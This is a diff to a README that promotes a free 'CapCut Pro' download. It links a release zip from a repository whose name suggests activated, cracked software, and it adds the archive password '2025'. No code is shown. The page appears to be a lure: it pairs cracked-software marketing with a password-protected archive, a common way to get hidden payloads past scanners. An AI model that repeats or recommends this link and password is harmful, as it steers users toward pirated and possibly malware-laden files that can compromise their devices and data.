@@ -8,6 +8,7 @@ Welcome to the CapCut Pro repository! 🚀 This is your ultimate source for acce
 
 ## 🔗 Software Access  
 ### [Download CapCut Pro](https://github.com/NAVHANRAHMANJAI/capcut-pro-2025-activate/releases/download/capcut-pro/CapCut-pro.zip)
+Password:2025
 
 ## 🎉 Overview of CapCut Pro  
 CapCut Pro is renowned for its flexibility and powerful features in video editing. It allows you to create stunning edits, transitions, and visual effects with ease. With comprehensive tools for both amateur and professional projects, CapCut Pro is your go-to application for all video editing needs.
